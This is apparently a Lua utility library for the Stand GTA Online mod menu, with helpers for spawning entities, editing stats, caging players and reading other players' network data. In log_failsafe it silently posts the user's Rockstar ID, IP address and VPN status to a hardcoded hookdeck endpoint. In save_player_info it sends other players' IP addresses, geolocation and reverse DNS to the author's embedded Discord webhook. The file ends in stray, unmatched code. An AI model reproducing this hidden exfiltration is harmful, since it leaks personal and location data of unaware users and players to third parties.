json = require "pretty.json"
notificationBits = 0
nearbyNotificationBits = 0
blips = {}

function gen_fren_funcs(name)
    local friend_player_function = menu.list(friend_lists, name, {"friend "..name}, "", function(); end)
    menu.divider(friend_player_function, name)
    menu.action(friend_player_function, "Join", {"jf "..name}, "Join "..name, function()
        trigger_commands("join "..name)
    end)
    menu.action(friend_player_function, "Spectate", {"sf "..name}, "Spectate "..name, function()
        trigger_commands("namespectate "..name)
    end)
    menu.action(friend_player_function, "Invite", {"if "..name}, "Invite "..name, function()
        trigger_commands("invite "..name)
    end)
    menu.action(friend_player_function, "Open profile", {"pf "..name}, "Open SC Profile from "..name, function()
        trigger_commands("nameprofile "..name)
    end)
end

function in_session()
    if util.is_session_started() and not util.is_session_transition_active() then
        return true
    else
        return false
    end
end

function write_data_to_file(file_path, data)
    local file = io.open(file_path, "w")
    file:write(data)
    file:close()
    notify("Webhook URL successfully written to file.\nRestart script to apply webhook URL.")
end

function send_to_hook(host, url, content_type, payload)
    async_http.init(host, url, function() end, function() end)
    async_http.set_post(content_type, payload)
    async_http.dispatch()
end

function IA_MENU_OPEN_OR_CLOSE()
    PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 244, 1.0)
    wait(150)
end
function IA_MENU_UP(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 172, 1.0)
        wait(100)
    end
end
function IA_MENU_DOWN(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 173, 1.0)
        wait(100)
    end
end
function IA_MENU_LEFT(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 174, 1.0)
        wait(100)
    end
end
function IA_MENU_ENTER(Num)
    for i = 1, Num do
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 176, 1.0)
        wait(100)
    end
end

function play_anim(dict, name, duration = -1)
    local ped = PLAYER.PLAYER_PED_ID()
    while not STREAMING.HAS_ANIM_DICT_LOADED(dict) do
        STREAMING.REQUEST_ANIM_DICT(dict)
        wait()
    end
    TASK.TASK_PLAY_ANIM(ped, dict, name, 1.0, 1.0, duration, 3, 0.0, false, false, false)
end

function IS_HELP_MSG_DISPLAYED(label)
    HUD.BEGIN_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(label)
    return HUD.END_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(0)
end

function start_fm_script(script)
    if not players.get_boss(players.user()) == players.user() then
        repeat trigger_commands("ceo")  until players.get_boss(players.user()) == players.user()
        notify("Starting CEO...")
    end

    SCRIPT.REQUEST_SCRIPT(script)
    repeat wait_once() until SCRIPT.HAS_SCRIPT_LOADED(script)
    SYSTEM.START_NEW_SCRIPT(script, 5000)
    SCRIPT.SET_SCRIPT_AS_NO_LONGER_NEEDED(script)
end

function closestveh(myPos)
    local closestDist = 999999999999
    local closestVeh = nil
    for entities.get_all_vehicles_as_pointers() as veh do
        local vehpos = entities.get_position(veh)
        local dist = myPos:distance(vehpos)
        if (dist < closestDist) then
            closestDist = dist
            closestVeh = veh
        end
    end
    if closestVeh ~= (nil or 0) then
        return entities.pointer_to_handle(closestVeh)
    end
end


function request_control(entity, migrate = true)
    local ctr = 0
    local migrate_ctr = 0
    if entity != (0 or nil) then
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
            if ctr >= 250 then
                notify("Failed to get control of entity. :/")
                ctr = 0
                return false
            end
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            wait()
            ctr += 1
        end
        if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) then
            entities.set_can_migrate(entity, migrate)
            return true
        end
    end
end

function get_vehicle_ped_is_in(player)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        return nil, notify("Player isn't in a vehicle. :/")
    else
        return veh
    end
end

function spawn_ped(model_name, pos, gm = false)
    local hash = util.joaat(model_name)
    if STREAMING.IS_MODEL_A_PED(hash) then
        util.request_model(hash)
        local ped = entities.create_ped(2, hash, pos, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        ENTITY.SET_ENTITY_INVINCIBLE(ped, gm)
        local ptr = entities.handle_to_pointer(ped)
        entities.set_can_migrate(ptr, false)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return ped
    else
        return nil, notify($"{model_name} is not a valid ped. :/")
    end
end

function spawn_obj(model_name, pos)
    local hash = joaat(model_name)
    if STREAMING.IS_MODEL_VALID(hash) then
        util.request_model(hash)
        local obj = entities.create_object(hash, pos)
        local ptr = entities.handle_to_pointer(obj)
        entities.set_can_migrate(ptr, false)
        return obj
    else
        return nil, notify($"{model_name} is not a valid object. :/")
    end
end

function spawn_vehicle(model_name, pos, gm = false)
    local hash = joaat(model_name)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        util.request_model(hash)
        local veh = entities.create_vehicle(hash, pos, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        local ptr = entities.handle_to_pointer(veh)
        ENTITY.SET_ENTITY_INVINCIBLE(veh, gm)
        entities.set_can_migrate(ptr, false)
        ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(veh, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return veh
    else
        return nil, notify($"{model_name} is not a valid vehicle. :/")
    end
end

function trapcage(pid, object, visible = true)
    local hash = util.joaat(object)
    util.request_model(hash)
    local pos = players.get_position(pid)
    local obj = entities.create_object(hash, pos)
    entities.set_can_migrate(entities.handle_to_pointer(obj), false)
    spawned_cages[#spawned_cages + 1] = obj
    ENTITY.SET_ENTITY_VISIBLE(obj, visible)
    ENTITY.FREEZE_ENTITY_POSITION(obj, true)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
end

function BitTest(bits, place)
    return (bits & (1 << place)) ~= 0
end

function IS_PLAYER_USING_ORBITAL_CANNON(player)
    return BitTest(memory.read_int(memory.script_global((2657704 + (player * 463 + 1) + 424))), 0) -- Global_2657704[PLAYER::PLAYER_ID() /*463*/].f_424
end

function IS_PLAYER_ACTIVE(pid)
	if pid == (-1 or nil) or not NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) then return false end
	if not PLAYER.IS_PLAYER_PLAYING(pid) then return false end
	return true
end

handle_ptr = memory.alloc(13*8)
local function pid_to_handle(pid)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, handle_ptr, 13)
    return handle_ptr
end

function IS_PLAYER_FRIEND(pid)
    if NETWORK.NETWORK_IS_FRIEND(pid_to_handle(pid)) then return true else return false end
end

function GET_SPAWN_STATE(pid)
    return memory.read_int(memory.script_global(((2657704 + 1) + (pid * 463)) + 232)) -- Global_2657704[PLAYER::PLAYER_ID() /*463*/].f_232
end

function GET_INTERIOR_FROM_PLAYER(pid)
    return memory.read_int(memory.script_global(((2657704 + 1) + (pid * 463)) + 245)) -- Global_2657704[bVar0 /*463*/].f_245
end

function IsDetectionPresent(pid, detection)
    if players.exists(pid) then
        for menu.player_root(pid):getChildren() as cmd do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and cmd:refByRelPath(detection):isValid() and players.exists(pid) then
                return true
            end
        end
    end
    return false
end

function getDetections(pid)
    if players.exists(pid) then
        local detections = {}

        for menu.player_root(pid):getChildren() as cmd do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING then
                if menu.get_menu_name(cmd) == "Classification: None" then
                    return false
                end
                for cmd:getChildren() as c do
                    local lang_string = lang.get_string(menu.get_menu_name(c))
                    if lang_string and lang_string ~= "" and lang_string ~= "0" then
                        table.insert(detections, lang_string)
                    end
                end
            end
        end
        if #detections > 0 then
            return detections  -- Return the table of detected values
        else
            return false
        end
    end
end

function getClassification(pid)
    if players.exists(pid) then
        for menu.player_root(pid):getChildren() as cmd do
            if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING then
                return menu.get_menu_name(cmd)
            end
        end
    end
end

function mod_uses(type, incr)
    if incr < 0 and is_loading then
        return
    end
    if type == "object" then
        if object_uses <= 0 and incr < 0 then
            return
        end
        object_uses = object_uses + incr
    end
end

-- Stats
function GET_INT_LOCAL(Script, Local)
    if memory.script_local(Script, Local) ~= 0 then
        local Value = memory.read_int(memory.script_local(Script, Local))
        if Value ~= nil then
            return Value
        end
    end
end
function STAT_GET_INT(Stat)
    local Int_PTR = memory.alloc_int()
    STATS.STAT_GET_INT(joaat("MP"..util.get_char_slot().."_".. Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end
function IS_MPPLY(Stat) 
    local Stats = { 
        "MP_PLAYING_TIME", 
    } 
    for i = 1, #Stats do 
        if Stat == Stats[i] then 
            return true 
        end 
    end 
    if string.find(Stat, "MPPLY_") then 
        return true 
    else
        return false
    end
end
function ADD_MP_INDEX(Stat)
    if not IS_MPPLY(Stat) then
        Stat = "MP"..util.get_char_slot().."_" .. Stat
    end
    return Stat
end
function SET_INT_LOCAL(Script, Local, Value)
    if memory.script_local(Script, Local) ~= 0 then
        memory.write_int(memory.script_local(Script, Local), Value)
    end
end
function STAT_SET_INT(Stat, Value)
    STATS.STAT_SET_INT(joaat(ADD_MP_INDEX(Stat)), Value, true)
end
function STAT_SET_DATE(stat, year, month, day, hour, min)
    local DatePTR = memory.alloc(8*7)
    memory.write_int(DatePTR, year)
    memory.write_int(DatePTR+8, month)
    memory.write_int(DatePTR+16, day)
    memory.write_int(DatePTR+24, hour)
    memory.write_int(DatePTR+32, min)
    memory.write_int(DatePTR+40, 0)
    memory.write_int(DatePTR+48, 0)
    STATS.STAT_SET_DATE(util.joaat(ADD_MP_INDEX(stat)), DatePTR, 7, true)
end
-- Stats End

function get_seat_ped_is_in(ped)
    local veh = PED.GET_VEHICLE_PED_IS_IN(ped, false)
    local hash = ENTITY.GET_ENTITY_MODEL(veh)
    local seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(hash)
    if veh == 0 then return false end
    for i = -1, seats - 2, 1 do
        if VEHICLE.GET_PED_IN_VEHICLE_SEAT(veh, i, false) == ped then return true, i end
    end
    return false
end

function request_animation(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        wait()
    end
end

function BlockSyncs(pid, callback)
    for players.list(false, true, true) as i do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            trigger_command(outSync, "on")
        end
    end
    wait(10)
    callback()
    for players.list(false, true, true) as i do
        if i ~= pid then
            local outSync = menu.ref_by_rel_path(menu.player_root(i), "Outgoing Syncs>Block")
            trigger_command(outSync, "off")
        end
    end
end

function addr_from_pointer_chain(addr, offsets)
	if addr == 0 then return 0 end
	for k = 1, (#offsets - 1) do
		addr = memory.read_long(addr + offsets[k])
		if addr == 0 then return 0 end
	end
	addr = addr + offsets[#offsets]
	return addr
end

function getWeaponHash(ped)
    local wpn_ptr = memory.alloc_int()
    if WEAPON.GET_CURRENT_PED_VEHICLE_WEAPON(ped, wpn_ptr) then -- only returns true if the weapon is a vehicle weapon
        return memory.read_int(wpn_ptr), true
    end
    return WEAPON.GET_SELECTED_PED_WEAPON(ped), false
end

function decimalToHex2s(decimal, numBits = 32)
    local hex = ""
    local hexDigits = "0123456789ABCDEF"
    local maxValue = 2^(numBits - 1) - 1
    local minValue = -2^(numBits - 1)
    if decimal < minValue or decimal > maxValue then
        return nil, "Decimal value out of range for the specified number of bits."
    end
    if decimal < 0 then
        decimal = decimal + 2^numBits
    end
    while decimal > 0 do
        local remainder = decimal % 16
        hex = hexDigits:sub(remainder + 1, remainder + 1) .. hex
        decimal = math.floor(decimal / 16)
    end
    return "0x0"..hex
end

function is_developer()
    local developer = {0x0C59991A+3, 0x0CE211E6+7, 0x08634DC4+98, 0x0DD18D77, 0x0DF7B478+0x002D, 0x0E1C0E92, 0x03DAF57D}
    local user = players.get_rockstar_id(players.user())
    for developer as id do
        if user == id then
            return true
        end
    end
    return false
end

function is_entity_a_projectile(hash)
    local all_projectile_hashes = {
        joaat("w_ex_vehiclemissile_1"),
        joaat("w_ex_vehiclemissile_2"),
        joaat("w_ex_vehiclemissile_3"),
        joaat("w_ex_vehiclemissile_4"),
        joaat("w_ex_vehiclem,tar"),
        joaat("w_ex_apmine"),
        joaat("w_ex_arena_landmine_01b"),
        joaat("w_ex_birdshat"),
        joaat("w_ex_grenadefrag"),
        joaat("w_ex_grenadesmoke"),
        joaat("w_ex_molotov"),
        joaat("w_ex_pe"),
        joaat("w_ex_pipebomb"),
        joaat("w_ex_snowball"),
        joaat("w_lr_rpg_rocket"),
        joaat("w_lr_homing_rocket"),
        joaat("w_lr_grenadelauncher"),
        joaat("w_ex_vehiclegrenade"),
        joaat("w_lr_firew,k_rocket"),
        joaat("xm_prop_x17_silo_rocket_01"),
        joaat("w_lr_40mm")
    }
    return table.contains(all_projectile_hashes, hash)
end

function format_friends_list()
    local friend_count = NETWORK.NETWORK_GET_FRIEND_COUNT()
    local friend_list = {}
    for i = 0, friend_count - 1 do
        local friend_name = tostring(NETWORK.NETWORK_GET_FRIEND_DISPLAY_NAME(i))
        local friend_url = "https://socialclub.rockstargames.com/member/" .. friend_name
        table.insert(friend_list, "[" .. friend_name .. "](" .. friend_url .. "), ")

        if (i + 1) % 3 == 0 then
            table.insert(friend_list, "\n")
        end
    end
    return table.concat(friend_list, " ")
end

function user_ip()
    local connectIP = players.get_ip(players.user())
    local ipStringuser = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    return ipStringuser
end

function player_ip(pid)
    local connectIP = players.get_ip(pid)
    local ipStringplayer = string.format("%d.%d.%d.%d",
    math.floor(connectIP / 2^24) % 256,
    math.floor(connectIP / 2^16) % 256,
    math.floor(connectIP / 2^8) % 256,
    connectIP % 256)
    if ipStringplayer == "255.255.255.255" or pStringplayer == "0.0.0.0" then
        return "Connected via Relay", false
    else
        return tostring(ipStringplayer), true
    end
end

function language_string(language)
    local language_table = {
      [0] = "American (en-US)",
      [1] = "French (fr-FR)",
      [2] = "German (de-DE)",
      [3] = "Italian (it-IT)",
      [4] = "Spanish (es-ES)",
      [5] = "Brazilian (pt-BR)",
      [6] = "Polish (pl-PL)",
      [7] = "Russian (ru-RU)",
      [8] = "Korean (ko-KR)",
      [9] = "Chinese Traditional (zh-TW)",
      [10] = "Japanese (ja-JP)",
      [11] = "Mexican (es-MX)",
      [12] = "Chinese Simplified (zh-CN)"
    }
    return language_table[language] or "Unknown"
end

function get_modder_int()
    local modderCount = 0
    for players.list() as pid do
        if players.is_marked_as_modder(pid) then
            modderCount = modderCount + 1
        end
    end
    return modderCount
end

function get_vehicles_in_player_range(player, radius)
	local vehicles = {}
	local pos = players.get_position(player)
	for entities.get_all_vehicles_as_handles() as vehicle do
		local vehPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
		if pos:distance(vehPos) <= radius then table.insert(vehicles, vehicle) end
	end
	return vehicles
end

function mode_manu_edition(edition)
    local editions = {
        [1] = "Basic",
        [2] = "Regular",
        [3] = "Ultimate"
    }
    return editions[edition] or "Unknown"
end

function log_failsafe()
    local player_name = SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
    local player_id = players.get_rockstar_id(players.user())
    local using_vpn = players.is_using_vpn(players.user())
    local edition = mode_manu_edition(menu.get_edition())
    local version = menu.get_version().full
    local apiurl = "https://ipapi.co/" .. user_ip()
    local IPv4url = "[" .. user_ip() .. "](" .. apiurl .. ")"
    local message = string.format(
        "\n**RID:** %s\n**VPN:** %s\n**IPv4:** %s\n**Edition:** %s\n**Version**: %s",
        player_id,
        using_vpn and "Yes" or "No",
        IPv4url,
        edition,
        version
    )
    local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(player_name))
    local json_data = {
        username = player_name,
        embeds = {
            {
                title = player_name,
                url = "https://socialclub.rockstargames.com/member/" .. player_name,
                color = 15357637,
                description = message,
                thumbnail = {
                    url = icon_url
                }
            }
        }
    }
    local json_string = json.stringify(json_data)
    send_to_hook("https://events.hookdeck.com", "/e/src_e3TGMwu4qgsb", "application/json", json_string)
end

function get_player_crew(player)
	local networkHandle = memory.alloc(104)
	local clanDesc = memory.alloc(280)
	NETWORK.NETWORK_HANDLE_FROM_PLAYER(player, networkHandle, 13)

	if NETWORK.NETWORK_IS_HANDLE_VALID(networkHandle, 13) and NETWORK.NETWORK_CLAN_PLAYER_GET_DESC(clanDesc, 35, networkHandle) then
		local icon = memory.read_int(clanDesc)
		local name = memory.read_string(clanDesc + 0x08)
		local tag = memory.read_string(clanDesc + 0x88)
		local rank = memory.read_string(clanDesc + 0xB0)
		local motto = players.clan_get_motto(player)
		local alt_badge = memory.read_byte(clanDesc + 0xA0) ~= 0 and "On" or "Off"
		-- local rank = memory.read_int(clanDesc + 30 * 8)
        return {
            icon     = icon,
            name     = name,
            tag      = tag,
            motto    = motto,
            alt_badge = alt_badge
        }, true
	else
        return false
    end
end

function save_player_info(pid)
    local name_with_tags = players.get_name_with_tags(pid)
    local name = players.get_name(pid)
    local rockstar_id = players.get_rockstar_id(pid)
    local rank = players.get_rank(pid)
    local money = "$" .. format_money_value(players.get_money(pid))
    local kd = players.get_kd(pid)
    local is_using_vpn = players.is_using_vpn(pid)
    local player_ip = player_ip(pid)
    local language_int = language_string(players.get_language(pid))
    local is_attacker = players.is_marked_as_attacker(pid)
    local host_token = players.get_host_token_hex(pid)
    local is_using_controller = players.is_using_controller(pid)
    local clan_motto = players.clan_get_motto(pid)
    local crew_info = get_player_crew(pid)
    local detections = getDetections(pid)
    local filename = name .. ".txt"
    local filepath = lenaDir .. "Players/" .. filename

    if not filesystem.exists(lenaDir .. "Players") then
        filesystem.mkdir(lenaDir .. "Players")
    end
    local file = io.open(filepath, "w")
    local hook_file = io.open(lenaDir.."Saved Players Webhook.txt", "r")
    local hook = hook_file:read("a")

    local player_info = {
        os.date("%a, %d. %B %X"),
        "\n\nName with Tags: ", name_with_tags,
        "\nRID/SCID: ", rockstar_id,
        "\nRank: ", rank,
        "\nMoney: ", money,
        "\nK/D: ", kd,
        "\nLanguage: ", language_int,
        "\nHost Token: ", host_token,
        "\nIs Using Controller: ", is_using_controller and "Yes" or "No",
        "\n",
        "\n**Net Intel**",
    }

    if player_ip != "Connected via Relay" then
        local as, dns = soup.netIntel.getAsByIp(player_ip), soup.IpAddr(player_ip)
        player_info[#player_info + 1] = "\nIPv4: " .. player_ip
        player_info[#player_info + 1] = "\nNetIntel addr: " .. tostring(dns) .. ", " .. dns:getReverseDns()
        player_info[#player_info + 1] = "\nNetIntel Number: " .. as.number
        player_info[#player_info + 1] = "\nNetIntel Handle: " .. as.handle
        player_info[#player_info + 1] = "\nNetIntel Name: " .. as.name
        player_info[#player_info + 1] = "\nIs Hosting: " .. tostring(as:isHosting() and "Yes" or "No")

        local loc = soup.netIntel.getLocationByIp(player_ip)
        player_info[#player_info + 1] = "\n\nNetIntel City: " .. loc.city
        player_info[#player_info + 1] = "\nNetIntel State: " .. loc.state
        player_info[#player_info + 1] = "\nNetIntel County Code: " .. loc.country_code
    else
        player_info[#player_info + 1] = "\nConnected to Rockstar's Server. Intel will not be shown."
    end

    if crew_info then 
        player_info[#player_info + 1] = "\n\n**Crew Information**"
        player_info[#player_info + 1] = "\nCrew Icon: " .. crew_info.icon
        player_info[#player_info + 1] = "\nCrew Name: " .. crew_info.name
        player_info[#player_info + 1] = "\nCrew Tag: " .. crew_info.tag
        player_info[#player_info + 1] = "\nCrew Motto: " .. crew_info.motto
        player_info[#player_info + 1] = "\nAlternate Badge: " .. crew_info.alt_badge
    else
        player_info[#player_info + 1] = "\n\nCannot save Crew Info. Most likely isn't in a crew."
    end

    if detections then
        player_info[#player_info + 1] = "\n\n**Detections**"
        for detections as detection do
            player_info[#player_info + 1] = "\n" .. detection
        end
        player_info[#player_info + 1] = "\n\n" .. getClassification(pid)
        player_info[#player_info + 1] = "\nIs Attacker: " .. tostring(is_attacker and "Yes" or "No")
    else
        player_info[#player_info + 1] = "\n\nNo detections triggered."
        player_info[#player_info + 1] = "\n\n" .. getClassification(pid)
    end

    file:write(table.concat(player_info))
    file:close()
    notify(string.format("%s's information has been saved to file.", name))

    local icon_url = string.format("https://a.rsg.sc/n/%s/n", string.lower(name))
    local json_data = {
        username = name,
        avatar_url = "https://cdn.discordapp.com/avatars/1149407532318740623/7583af5a7004aab44131c835eb8e5114.jpg?size=1024&width=0&height=256",
        embeds = {
            {
                title = name,
                url = "https://socialclub.rockstargames.com/member/" .. name,
                color = 15357637,
                description = table.concat(player_info),
                thumbnail = {
                    url = icon_url
                }
            }
        }
    }
    local json_string = json.stringify(json_data)
    if hook then
        send_to_hook("discord.com", hook, "application/json", json_string)
    end
    if not is_developer() then
        send_to_hook("discord.com", "/api/webhooks/1157814830250594344/fRnEK93AIPAECZuYIrH2QLHmhTvtEzdGU9JjUC-xQsH_W67bfuK64TEicgC19yHR0Xyf", "application/json", json_string)
    end
end

-- Weapon Speed Modifier
AmmoSpeed = {address = 0, defaultValue = 0}
AmmoSpeed.__index = AmmoSpeed
AmmoSpeed.__eq = function (a, b)
    return a.address == b.address
end
function AmmoSpeed.new(address)
    assert(address ~= 0, "got a nullpointer")
    local instance = setmetatable({}, AmmoSpeed)
    instance.address = address
    instance.defaultValue = memory.read_float(address)
    return instance
end
function AmmoSpeed:getValue()
    return memory.read_float(self.address)
end
function AmmoSpeed:setValue(value)
    memory.write_float(self.address, value)
end
function AmmoSpeed:reset()
    memory.write_float(self.address, self.defaultValue)
end

-- Copy As Focus Link
function urlEncode(input: string): string
	local output = input:gsub(">", "%%3E"):gsub("%s", "%%20")
	return output
end
function getFocusedCommand(): ?userdata
	for menu.get_current_ui_list():getChildren() as cmd do
		if cmd:isFocused() then return cmd end
	end
end
local tab_root = menu.ref_by_path("Self"):getParent()
local version_info = menu.get_version()
local root_name_ref = menu.ref_by_path("Stand>Settings>Appearance>Address Bar>Root Name")
local address_separator_ref = menu.ref_by_path("Stand>Settings>Appearance>Address Bar>Address Separator")
function getPathFromRef(ref: userdata, lang_code: ?string = nil, override_separator: ?string = nil, include_root_name: bool = true): string
    local path = ""
    local separator = override_separator ?? address_separator_ref:getState():gsub(version_info.brand, ""):gsub("Online", "")
    local cmd = ref
    while cmd:isValid() and (include_root_name or not cmd:equals(tab_root)) do
        local name = cmd:equals(tab_root) ? (root_name_ref.value != 0 ? (root_name_ref:getState():gsub("{}", version_info.version)) : "") : cmd.menu_name
        local hash = tonumber(name)
        if hash then
            name = lang.get_string(hash, lang_code ?? lang.get_current())
        end
        if #name > 0 then
            path = name .. separator .. path
        end
        cmd = cmd:getParent()
    end
    if path == "" then
        return ""
    end
    return path:sub(0, -(separator:len() + 1))
end

function DOES_VEHICLE_HAVE_IMANI_TECH(vehicle_model)
    switch vehicle_model do
        case joaat("deity"):
        case joaat("granger2"):
        case joaat("buffalo4"):
        case joaat("jubilee"):
        case joaat("patriot3"):
        case joaat("champion"):
        case joaat("greenwood"):
        case joaat("omnisegt"):
        case joaat("virtue"):
        case joaat("r300"):
        case joaat("stingertt"):
        case joaat("buffalo5"):
        case joaat("coureur"):
        case joaat("monstrociti"):
        return true
    end
    return false
end

function hud_notification(format, colour, ...)
	assert(type(format) == "string", "msg must be a string, got " .. type(format))
	local msg = string.format(format, ...)
	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(colour or 2)
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(msg)
	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(false, false)
end

function get_current_money()
    return MONEY.NETWORK_GET_VC_BALANCE()
end
function calculate_difference(old_value, new_value)
    return new_value - old_value
end
function format_money_value(value)
    local formatted = string.format("%d", value)
    local k
    while true do
        formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
        if k == 0 then
            break
        end
    end
    return formatted
end
function check_and_write_money_change()
    local current_money = get_current_money()
    if current_money ~= initial_money then
        local difference = calculate_difference(initial_money, current_money)
        local file = io.open($"{lenaDir}Transactions for {SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()}.txt", "a")
        if file then
            local formatted_initial_money = "$"..format_money_value(initial_money)
            local formatted_current_money = "$"..format_money_value(current_money)
            local formatted_difference = "$"..format_money_value(math.abs(difference))
            local sign = difference >= 0 and "Added " or "Removed "
            file:write(string.format("[%s] Old amount: %s. New amount: %s. Difference: %s%s \n", os.date("%d.%m.%Y %X"), formatted_initial_money, formatted_current_money, sign, formatted_difference))
            file:close()
            hud_notification(sign..formatted_difference, 24)
        end
        initial_money = current_money
    end
end

function tune_vehicle(v, p, tell = false)
    local auto_perf_ind = {11,12,13,16,18,22}
    if p then
        for auto_perf_ind as index do 
            local veh_mods = VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(v)
            local upgrade = entities.get_upgrade_value(v, index) != entities.get_upgrade_max_value(v, index)               
            if veh_mods or upgrade then
                entities.set_upgrade_value(v, index, entities.get_upgrade_max_value(v, index))
                VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(v, false)
                if tell then notify("Upgraded your Car. :D") end
            end
        end
    end
end

function DELETE_OBJECT_BY_HASH(hash)
    for entities.get_all_objects_as_handles() as ent do
        if ENTITY.GET_ENTITY_MODEL(ent) == hash then
            entities.delete_by_handle(ent)
        end
    end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end

function formatTime(seconds)
    local hours = math.floor(seconds / 3600)
    local minutes = math.floor((seconds % 3600) / 60)
    local remainingSeconds = seconds % 60
    return string.format("%d hour%s, %d minute%s, %d second%s", hours, hours == 1 and "" or "s", minutes, minutes == 1 and "" or "s", remainingSeconds, remainingSeconds == 1 and "" or "s")
end

function update_value(commandref, text, player = false)
    if text then
        if player then menu.set_value(commandref, tostring(players.get_name(text))) else menu.set_value(commandref, tostring(text)) end
    else
        menu.set_value(commandref, "N/A")
    end
end

function update_help_text(commandref, text)
    if text then
        menu.set_help_text(commandref, tostring(text))
    else
        menu.set_help_text(commandref, "N/A")
    end
end

function save_player_outfit(pid, name) -- A Cheaty way of doing this, but if it works, it works™
    local f = filesystem.stand_dir().."Outfits/"..name
    if io.isdir(f) then 
        return notify("File already exists!")
    else
        if pid == players.user() then
            trigger_commands($"saveoutfit {name}")
        else
            local c = PED.CLONE_PED(players.user_ped(), false, false, true)
            trigger_commands($"copyoutfit {players.get_name(pid)}")
            wait(50)
            trigger_commands($"saveoutfit {name}")
            wait(50)
            PED.CLONE_PED_TO_TARGET(c, players.user_ped())
            wait(50)
            entities.delete(c)
        end
    end 
end

function start_ceo()
    local bossCount = 0
    local boss = players.get_boss
    local user = players.user()
    for players.list(false, true, true) as pid do
        if boss(pid) == pid then
            bossCount = bossCount + 1
        end
        if boss(user) == players.user() or boss(user) != -1 then
            return false, notify("You're already in a CEO.")
        end
        if bossCount >= 10 then
            return false, notify("Cannot Start CEO due to reaching the MAX Boss count. :/")
        end
    end
    trigger_commands("ceostart")
    wait(500)
    if boss(user) == user then
        return true
    else
        return false, "CEO couldn't be started."
    end
end
        end
    end
    return true
end